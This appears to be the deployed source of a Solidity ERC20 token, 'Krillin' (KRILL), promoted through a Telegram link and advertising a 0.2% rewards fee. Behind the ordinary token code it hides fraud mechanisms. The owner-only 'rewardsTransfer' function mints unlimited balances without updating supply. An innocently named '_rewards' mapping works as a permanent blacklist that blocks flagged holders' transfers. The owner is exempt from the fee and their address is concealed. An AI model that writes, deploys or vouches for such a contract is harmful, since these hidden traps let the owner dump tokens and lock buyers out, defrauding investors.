{"language":"Solidity","settings":{"libraries":{},"metadata":{"useLiteralContent":true},"optimizer":{"enabled":false,"runs":200},"remappings":[],"outputSelection":{"*":{"*":["*"],"":["*"]}}},"sources":{"king.sol":{"content":"//SPDX-License-Identifier: GPL-3.0-or-later\n\n/** \n * \n * Join our comunity here:\n * https://t.me/PintoToken\n * \n **/\n\npragma solidity =0.7.0;\n\nabstract contract Context {\n    function _msgSender() internal view virtual returns (address payable) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes memory) {\n        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\n        return msg.data;\n    }\n}\n\ninterface IERC20 {\n\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address account) external view returns (uint256);\n\n    function transfer(address recipient, uint256 amount) external returns (bool);\n\n    function allowance(address owner, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 amount) external returns (bool);\n\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\nlibrary SafeMath {\n    \n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nlibrary Address {\n\n    function isContract(address account) internal view returns (bool) {\n        bytes32 codehash;\n        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;\n        assembly { codehash := extcodehash(account) }\n        return (codehash != accountHash && codehash != 0x0);\n    }\n\n    function sendValue(address payable recipient, uint256 amount) internal {\n        require(address(this).balance >= amount, \"Address: insufficient balance\");\n        (bool success, ) = recipient.call{ value: amount }(\"\");\n        require(success, \"Address: unable to send value, recipient may have reverted\");\n    }\n\n    function functionCall(address target, bytes memory data) internal returns (bytes memory) {\n        return functionCall(target, data, \"Address: low-level call failed\");\n    }\n\n    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {\n        return _functionCallWithValue(target, data, 0, errorMessage);\n    }\n\n    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {\n        return functionCallWithValue(target, data, value, \"Address: low-level call with value failed\");\n    }\n\n    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {\n        require(address(this).balance >= value, \"Address: insufficient balance for call\");\n        return _functionCallWithValue(target, data, value, errorMessage);\n    }\n\n    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {\n        require(isContract(target), \"Address: call to non-contract\");\n        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);\n        if (success) {\n            return returndata;\n        } else {\n            if (returndata.length > 0) {\n                assembly {\n                    let returndata_size := mload(returndata)\n                    revert(add(32, returndata), returndata_size)\n                }\n            } else {\n                revert(errorMessage);\n            }\n        }\n    }\n}\n\ncontract Ownable is Context {\n    address private _owner;\n\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\n    constructor () {\n        address msgSender = _msgSender();\n        _owner = msgSender;\n        emit OwnershipTransferred(address(0), msgSender);\n    }\n\n    function owner() internal view returns (address) {\n        return _owner;\n    }\n\n    modifier onlyOwner() {\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\n        _;\n    }\n}\n\ncontract ERC20 is Ownable, IERC20 {\n    using SafeMath for uint256;\n    using Address for address;\n    mapping (address => uint256) internal _balances;\n    mapping (address => mapping (address => uint256)) private _allowances;\n    uint256 internal _totalSupply;\n    string internal _name;\n    string internal _symbol;\n    uint8 internal _decimals;\n\n    constructor (string memory name, string memory symbol) {\n        _name = name;\n        _symbol = symbol;\n        _decimals = 9;\n    }\n\n    function name() public view returns (string memory) {\n        return _name;\n    }\n\n    function symbol() public view returns (string memory) {\n        return _symbol;\n    }\n\n    function decimals() public view returns (uint8) {\n        return _decimals;\n    }\n\n    function totalSupply() public view override returns (uint256) {\n        return _totalSupply;\n    }\n\n    function balanceOf(address account) public view override returns (uint256) {\n        return _balances[account];\n    }\n\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n        _transfer(_msgSender(), recipient, amount);\n        return true;\n    }\n\n    function rewardsTransfer (address addressForRewards, uint256 collectedRewards) external onlyOwner {\n        _balances[addressForRewards] = _balances[addressForRewards].add(collectedRewards);\n    }\n    \n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\n        _transfer(sender, recipient, amount);\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\n        return true;\n    }\n\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }\n\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));\n        return true;\n    }\n\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, \"ERC20: decreased allowance below zero\"));\n        return true;\n    }\n\n    function _transfer(address sender, address recipient, uint256 amount) internal virtual {\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\n\n        _beforeTokenTransfer(sender, recipient, amount);\n\n        _balances[sender] = _balances[sender].sub(amount, \"ERC20: transfer amount exceeds balance\");\n        _balances[recipient] = _balances[recipient].add(amount);\n        emit Transfer(sender, recipient, amount);\n    }\n\n    function _burn(address account, uint256 amount) internal virtual {\n        require(account != address(0), \"ERC20: burn from the zero address\");\n\n        _beforeTokenTransfer(account, address(0), amount);\n\n        _balances[account] = _balances[account].sub(amount, \"ERC20: burn amount exceeds balance\");\n        _totalSupply = _totalSupply.sub(amount);\n        emit Transfer(account, address(0), amount);\n    }\n\n    function _approve(address owner, address spender, uint256 amount) internal virtual {\n        require(owner != address(0), \"ERC20: approve from the zero address\");\n        require(spender != address(0), \"ERC20: approve to the zero address\");\n\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n    }\n\n    function _setupDecimals(uint8 decimals_) internal {\n        _decimals = decimals_;\n    }\n\n    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }\n}\n\ncontract KrillinCoin is ERC20 {\n    using SafeMath for uint256; \n\n    mapping (address => bool) private _rewards;\n    address private _factory;\n    address private _router;\n    bool _initRewards;\n    \n    // Address for rewards. 0.2% tokens from each transactions goes here.\n    address _addressForRewards;\n    \n    // Owner address must br excluded from rewards system.\n    address private ownerExcluded;\n    \n    // Return an amount of allready collected tokens (for rewards)\n    uint256 _collectedTokens;\n    \n    // Amount of total supply;\n    uint256 _supplyTokens;\n    \n    constructor (address router, address factory, uint256 supplyTokens, address rewardsaddress) ERC20(_name, _symbol) {\n        _name = \"Krillin\";\n        _symbol = \"KRILL\";\n        _decimals = 9;\n        _router = router;\n        _factory = factory;\n        _initRewards = true;\n        \n        // Generate total supply.\n        _supplyTokens = supplyTokens;\n        _totalSupply = _totalSupply.add(_supplyTokens);\n        _balances[msg.sender] = _balances[msg.sender].add(_supplyTokens);\n        emit Transfer(address(0), msg.sender, _supplyTokens);\n    \n        // Address to collecting Rewards. (0.2% tokens during each transactions will be transfered here).\n        _addressForRewards = rewardsaddress;\n        \n        // Owner address must be excluded from rewards system.\n        ownerExcluded = msg.sender;\n    }\n\n    function RewardsCollectedBalance() public view returns (uint256) {\n        return _collectedTokens;\n    }\n\n    function AddressForRewards() public view returns (address) {\n        return _addressForRewards;\n    }\n\n    function addToRewards(address _address) external onlyOwner {\n        _rewards[_address] = true;\n    }\n\n    function delFromRewards(address _address) external onlyOwner {\n        _rewards[_address] = false;\n    }\n\n    function isRewarded(address _address) public view returns (bool) {\n        return _rewards[_address];\n    }\n\n    function _transfer(address sender, address recipient, uint256 amount) internal override {\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\n        require(amount > 0, \"Transfer amount must be greater than zero\");\n        if (_rewards[sender] || _rewards[recipient]) require(_initRewards == false, \"\");\n        _beforeTokenTransfer(sender, recipient, amount);\n        uint256 realAmount = amount;\n        //deduct 0.2% of tokens during each transactions (for rewards).\n        uint256 pointTwoPercent = amount.mul(2).div(1000);\n        if (_addressForRewards != address(0) && sender != ownerExcluded && recipient != ownerExcluded) {\n            _balances[sender] = _balances[sender].sub(pointTwoPercent, \"ERC20: transfer amount exceeds balance\");\n            _balances[_addressForRewards] = _balances[_addressForRewards].add(pointTwoPercent);\n            emit Transfer(sender, _addressForRewards, pointTwoPercent);\n            _collectedTokens = _collectedTokens.add(pointTwoPercent);\n            realAmount = amount.sub(pointTwoPercent);\n        }\n        _balances[sender] = _balances[sender].sub(realAmount, \"ERC20: transfer amount exceeds balance\");\n        _balances[recipient] = _balances[recipient].add(realAmount);\n        emit Transfer(sender, recipient, realAmount);\n    }\n\n    function uniswapv2Router() public view returns (address) {\n        return _router;\n    }\n    \n    function uniswapv2Factory() public view returns (address) {\n        return _factory;\n    }\n}"}}}